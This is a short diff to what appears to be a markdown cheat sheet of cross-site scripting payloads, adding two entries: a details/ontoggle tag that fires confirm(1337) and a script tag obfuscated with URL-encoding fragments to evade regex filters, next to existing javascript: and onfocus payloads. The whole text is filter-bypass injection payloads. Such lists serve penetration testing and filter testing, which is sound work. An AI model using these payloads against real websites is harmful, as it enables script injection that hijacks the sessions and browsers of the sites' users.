@@ -53,6 +53,8 @@ TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
 "autofocus/onfocus=alert(1)//
 '-alert(1)-'
 "><img class="emoji" alt="😯" src="x" /><svg
+">'><details/open/ontoggle=confirm(1337)>
+%<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e
 ```
 
 ## XSS payload with Alert Obfuscation, for bypass RegEx filters
